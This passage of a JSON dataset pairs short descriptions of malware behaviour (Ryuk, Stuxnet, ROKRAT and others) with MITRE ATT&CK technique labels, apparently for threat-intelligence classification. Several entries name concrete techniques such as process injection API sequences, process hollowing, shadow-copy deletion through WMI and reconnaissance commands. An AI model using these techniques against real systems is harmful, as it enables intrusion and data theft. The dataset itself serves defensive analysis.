    "text": "SodaMaster has the ability to download additional payloads from C2 to the targeted system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SodaMaster can use RegOpenKeyW to access the Registry.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SodaMaster can search a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SodaMaster has the ability to query the Registry to detect a key specific to VMware.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "SodaMaster can enumerate the host name and OS version on a target system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SodaMaster can identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Industroyer’s data wiper component enumerates specific files on all the Windows drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Industroyer downloads a shellcode payload from a remote C2 server and loads it into memory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Industroyer has a data wiper component that enumerates keys in the Registry HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Industroyer collects the victim machine’s Windows GUID.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Industroyer’s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Industroyer can use supplied user credentials to execute processes and stop services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Ferocious has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Ferocious can use GET.WORKSPACE in Microsoft Excel to determine the OS version of the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bundlore can download and execute new versions of itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Bundlore has used the ps command to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Bundlore will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PinchDuke gathers system configuration information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Neoichor can upload files from a victim's machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Neoichor can download additional files onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Neoichor has the ability to configure browser settings by modifying Registry entries under HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Neoichor can collect the OS version and computer name from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Neoichor can gather the IP address from an infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Neoichor can check for Internet connectivity by contacting bing[.]com with the request format bing[.]com?id=<GetTickCount>.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Neoichor can collect the user name from a victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "CSPY Downloader can download additional tools to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CSPY Downloader can write to the Registry under the %windir% variable to execute tasks.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Matryoshka uses reflective DLL injection to inject the malicious library and execute the RAT.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can collect host data and specific file types.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can retrieve additional malicious payloads from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can modify the HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\ registry key so it can bypass the VB object model (VBOM) on a compromised host.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can use a variety of API calls to execute shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can list the current running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can use VirtualAlloc, WriteProcessMemory, and then CreateRemoteThread to execute shellcode within the address space of Notepad.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can access the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can gather the hostname and the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT can collect the username from a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "VERMIN gathers the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Brave Prince gathers file and directory information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Brave Prince gathers information about the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Brave Prince gathers network configuration information as well as the ARP cache.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Denis used the IsDebuggerPresent, OutputDebugString, and SetLastError APIs to avoid debugging. Denis used GetProcAddress and LoadLibrary to dynamically resolve APIs. Denis also used the Wow64SetThreadContext API as part of a process hollowing process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Denis collects OS information and the computer name from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Denis enumerates and collects the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Calisto runs the ifconfig command to obtain the IP address from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Zox has the ability to upload files from a targeted system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Zox can enumerate files on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Zox can download files to a compromised machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Zox has the ability to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Zox can enumerate attached drives.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BBK has the ability to download files from C2 to the infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BBK has the ability to use the CreatePipe API to add a sub-process for execution via cmd.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BBK has the ability to inject shellcode into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "HELLOKITTY can search for specific processes to terminate.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "HELLOKITTY can enumerate logical drives on a target system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HELLOKITTY can use WMI to delete volume shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "ShimRat has the capability to upload collected files to a C2.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "ShimRat can list directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ShimRat can download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ShimRat has registered two registry keys for shim databases.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ShimRat has used Windows API functions to install the service and shim.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk has enumerated files and folders on all mounted drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk has used multiple native APIs including ShellExecuteW to run executables,GetWindowsDirectoryW to create folders, and VirtualAlloc, WriteProcessMemory, and CreateRemoteThread for process injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk has called CreateToolhelp32Snapshot to enumerate all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk has called GetLogicalDrives to emumerate all mounted drives, and GetDriveTypeW to determine the drive type.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk can use stolen domain admin accounts to move laterally within a victim domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Out1 can copy files and Registry data from compromised hosts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Winnti for Windows can check for the presence of specific files prior to moving to the next phase of execution.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The Winnti for Windows dropper can place malicious payloads on targeted systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Winnti for Windows can use Native API to create a new process and to start services.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Winnti for Windows can check if the explorer.exe process is responsible for calling its install function.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Winnti for Windows can determine if the OS on a compromised host is newer than Windows XP.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "DarkComet adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=\"0\" and HKEY_CURRENT_USER\\Software\\DC3_FEXEC.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "DarkComet can list active processes running on the victim’s machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "DarkComet gathers the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "KillDisk has used the FindNextFile command as part of its file deletion process.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "KillDisk has called the Windows API to retrieve the hard disk handle and shut down the machine.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "KillDisk has called GetCurrentProcess.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "KillDisk retrieves the hard disk name by calling the CreateFileA to \\.\\PHYSICALDRIVE0 API.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon can install additional modules via C2 commands.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon has stored its encrypted payload in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon's first stage has been executed by a call to CreateProcess with the decryption password in an argument. PipeMon has used a call to LoadLibrary to load its installer.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon can iterate over the running processes to find a suitable injection target.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon can inject its modules into various processes using reflective DLL loading.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon can collect and send OS version and computer name as a part of its C2 beacon.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "njRAT can download files to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "njRAT can create, delete, or modify a specified Registry key or value.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "njRAT has used the ShellExecute() function within a script.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "njRAT can search a list of running processes for Tr.exe.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "njRAT can read specific registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "BendyBear is designed to download an implant from a C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BendyBear can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BendyBear can query the host's Registry key at HKEY_CURRENT_USER\\Console\\QuickEdit to retrieve data.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Peppy can identify specific files for exfiltration.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Peppy can download and execute remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DRATzarus can collect information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "DRATzarus can deploy additional tools onto an infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DRATzarus can use various API calls to see if it is running in a sandbox.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "DRATzarus can enumerate and examine running processes to determine if a debugger is present.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "DRATzarus can obtain a list of users from an infected machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SpeakUp uses the cat /proc/cpuinfo | grep -c \"cpu family\" 2>&1 command to gather system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT can retrieve an additional payload from its C2 server.[3][7] JHUHUGIT has a command to download files to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A JHUHUGIT variant gathers network interface card information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Astaroth searches for different processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "AADInternals can modify registry keys as part of setting a new pass-through authentication agent.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Javali can download payloads from remote C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Javali can monitor processes for open browsers and custom banking applications.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "DDKONG lists files on the victim’s machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DDKONG downloads and uploads files on the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MegaCortex can parse the available drives and directories to determine which files to encrypt.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "MegaCortex has added entries to the Registry for ransom contact information.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "After escalating privileges, MegaCortex calls TerminateProcess(), CreateRemoteThread, and other Win32 APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "MegaCortex loads injecthelper.dll into a newly created rundll32.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "zwShell can modify the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can enumerate drives and their types. It can also change file permissions using cacls.exe.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can inject content into lsass.exe to load a module.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Kessel can download additional modules from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Kessel has collected the system architecture, OS version, and MAC address information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kessel has collected the DNS address of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "T9000 gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "T9000 gathers and beacons the MAC and IP addresses during installation.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "T9000 gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> \"C:\\windows\\TEMP[RANDOM].tmp\".",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects a list of running services with the command tasklist /v.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack can collect a variety of information from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack can list files on available disk volumes.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack’s can download and upload a file to the victim’s computer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack’s dropper can list all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack can collect the victim's computer name, hostname and adapter information to create a unique identifier.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack can collect the host's IP addresses using the ipconfig command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Dtrack used hard-coded credentials to gain access to a network share.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "GrimAgent can collect data and files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "GrimAgent has the ability to enumerate files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "GrimAgent has the ability to download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GrimAgent can use Native API including GetProcAddress and ShellExecuteW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "GrimAgent can collect the OS, and build version on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "GrimAgent can enumerate the IP and domain of a target system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "GrimAgent can identify the user id on a target machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet uses a driver to scan for specific filesystem driver objects.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet can create registry keys to load driver files.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet uses the SetSecurityDescriptorDacl API to reduce object integrity levels.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet injects an entire DLL into an existing, newly created, or preselected trusted process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet searches the Registry for indicators of security programs.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet collects system information including computer and domain names, OS version, and S7P paths.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet collects the IP address of a compromised system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet infected WinCC machines via a hardcoded database server password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet attempts to access network resources with a domain account’s credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Stuxnet used WMI with an explorer.exe token to execute on a remote share.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Crutch can exfiltrate files from compromised systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Seth-Locker has the ability to download and execute files on a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cadelspy has the ability to discover information about the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SharpStage has the ability to download and execute additional payloads via a DropBox API.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SharpStage has checked the system settings to see if Arabic is the configured language.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SharpStage can use WMI for execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower can collect data and files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower can enumerate drives and list the contents of the C: drive on a victim's computer.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower has the ability to download additional modules to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower can remove persistence-related artifacts from the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower has the ability to list running processes through the use of tasklist.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower has the ability to enumerate Uninstall registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower can enumerate the OS version and computer name on a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower has the ability to use ipconfig to enumerate system network settings.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower can use wmic to gather information from a system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WindTail has the ability to enumerate the users home directory and the path to its own application bundle.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WindTail can invoke Apple APIs contentsOfDirectoryAtPath, pathExtension, and (string) compare.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PHOREAL is capable of manipulating the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SHARPSTATS has the ability to upload and download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SHARPSTATS has the ability to identify the IP address, machine name, and OS of the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SHARPSTATS has the ability to identify the domain of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SHARPSTATS has the ability to identify the username on the compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can obtain a list of directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can download additional files and tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can obtain the OS version and build, computer name, and processor architecture from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can retrieve the contents of the IP routing table as well as information about the Windows domain.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Orz can perform Registry operations.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "More_eggs has used HTTP GET requests to check internet connectivity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BoxCaon can upload files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BoxCaon has searched for files on the system, such as documents located in the desktop folder.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BoxCaon can download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BoxCaon has used Windows API calls to obtain information about the compromised host.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BoxCaon can collect the victim's MAC address by using the GetAdaptersInfo API.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "StoneDrill has used the WMI command-line (WMIC) utility to run tasks.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "NOKKI can gather information on drives and the operating system on the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "NOKKI can collect the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
